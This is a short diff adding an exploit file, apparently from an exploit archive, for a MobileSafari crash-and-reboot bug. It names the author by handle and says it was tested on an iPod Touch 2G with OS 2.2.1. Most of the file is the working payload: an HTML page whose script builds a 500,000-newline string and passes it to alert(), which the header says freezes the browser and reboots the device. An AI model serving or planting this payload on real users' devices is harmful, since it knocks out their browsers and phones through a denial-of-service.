@@ -1,0 +1,23 @@
+# Apple iPhone (MobileSafari) Crash &amp; Reboot
+# TheLeader, GSOG [st0p] hotmail [sp4m] com
+# Shoutz: hacking.org.il nullbyte.org.il
+
+# Tested on iPod Touch 2G, OS 2.2.1
+# Launch MobileSafari, enter the page and MobileSafari will freeze.
+# Wait for 4-5 minutes and the device will spontaneously reboot.
+
+# Exploit:
+
+&lt;html&gt;
+&lt;body&gt;
+&lt;script&gt;
+var a = &#039;&#039;;
+for (var i = 1; i &lt;= 500000; i++)
+{
+  a += &#039;\n&#039;;
+}
+alert(a);
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
